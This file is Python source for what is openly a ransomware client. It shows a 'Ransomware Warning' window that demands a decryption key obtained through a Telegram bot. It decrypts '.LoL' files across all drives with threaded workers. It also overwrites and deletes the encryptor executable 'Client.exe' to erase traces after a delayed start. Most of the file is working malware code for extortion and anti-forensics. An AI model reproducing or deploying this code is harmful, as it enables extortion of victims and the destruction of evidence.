import telegram, asyncio             
from nacl.public import PrivateKey, PublicKey, Box
import nacl, nacl.secret
from datetime import datetime
from time import sleep
import os, sys, ctypes, tkinter
from tkinter import messagebox
from threading import Thread
import threading
import time
from multiprocessing import Process
from PIL import Image, ImageDraw, ImageFont
from tkinter import Label, Entry, Button
import base64, sys
import pathlib

#0. 기본 환경설정
AES_BOX=0
DecryptModule=0
PRIVATE_KEY_AES=0

MaxThread=120
ThreadPool=[]
IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()

PathList=[]

entry=0
removeTarget="Client.exe"
filePath=sys.argv[0]

def setDecryptModule(privateKeyAES):
    global DecryptModule
    DecryptModule=nacl.secret.SecretBox(privateKeyAES)
    
class Decryptor:
    def __init__(self, files=0, decryptModule=0):
        self._files=files

    @classmethod
    def decEach(self, path):
        try:
            originName=path.strip(".LoL")
            with open(path, "rb") as File:
                data=File.read()
            decryptedFile=DecryptModule.decrypt(data)
            with open(originName, "wb") as File:
                File.write(decryptedFile)
            os.remove(path)
        except (PermissionError, FileNotFoundError):
            if (os.path.isfile(originName)):
                os.remove(originName)

    def decryptFile(self):
        for file in self._files:
            if(os.path.isfile(file)==True):
                if(file==sys.argv[0]):
                    return
                    
                try:
                    extension=os.path.splitext(file)[-1]
                    if(extension!='.LoL'):
                        continue;
                    
                    if(os.path.getsize(file)>50000000):
                        if (len(ThreadPool)<MaxThread):
                            th=Thread(target=Decryptor.decEach, args=(file,))
                            ThreadPool.append(th)
                            th.start()
                        else:
                            self.decEach(file)
                    else :
                        self.decEach(file)
                except Exception as e:
                    pass

def listUpTargetDir():
    global PathList
    PathList=[r"C:\Users\\", r"C:\Program Files\\", r"C:\Program Files (x86)\\"]
    for letter in range(97, 123):
        drive=f"{chr(letter)}:\\"
        if (pathlib.Path(drive).exists()):
            PathList.append(drive)
    PathList.remove("c:\\")
    

def recursiveDecrypt(basepath):
    try:
        files=[]
        dirs=[]
        for entry in os.listdir(basepath):
            absolutePath=os.path.join(basepath, entry)
            if os.path.isfile(absolutePath):
                files.append(absolutePath)
            elif os.path.isdir(absolutePath):
                dirs.append(absolutePath)

        if (len(files)>0):
            Decryptor(files).decryptFile()
        for dir in dirs:
            recursiveDecrypt(dir)
    except Exception as e:
        pass

def doDec():
    for drive in PathList:
        recursiveDecrypt(drive)
    while (len(ThreadPool)!=0):
        th=ThreadPool.pop()
        th.join()

#복호화
def decryptComputer():
    global entry
    buf=entry.get()
    try:
        AESKey=base64.b64decode(buf[10:])
        setDecryptModule(AESKey)
        
        th=Thread(target=doDec)
        th.start()
        warningInProgress()
        th.join()
        
        completeDecryption()
        
        sleep(10)
        sys.exit(0)
    except Exception as e:
        pass

def ransomewareWarning():
    global entry
    WINDOW=tkinter.Tk()
    WINDOW.title('Ransomware Warning')
    WINDOW.geometry('400x100')
    WINDOW.resizable(False, False)

    lab=Label(WINDOW)
    lab['text']='Input Key for Decryption: '
    lab.pack()
    entry=Entry(WINDOW)
    entry.pack()
    lab2=Label(WINDOW)
    lab2['text']='If you turn off this window, You cannot get back your computer:)'
    lab2.pack()
    lab3=Label(WINDOW)
    lab3['text']='Send Message to @rans_key_bot by using telegram'
    lab3.pack()
    btn=Button(WINDOW, text="decrypt!", command=decryptComputer)
    btn.pack()
    
    WINDOW.mainloop()

def warningInProgress():
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("DO NOT TOUCH COMPUTER", "Decryption is working...")
   
def completeDecryption():
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("User computer is unlocked!", "Thank you for using our service:):):):):) Bye!")

def eraseEncryptor():
    try:
        with open(removeTarget, "wb") as File:
            file_size=os.path.getsize(removeTarget)
            File.write(os.urandom(file_size+1))
        os.remove(removeTarget)
    except Exception as e:
        pass

if __name__=='__main__':
    sleep(500)
    eraseEncryptor()
    listUpTargetDir()
    ransomewareWarning()
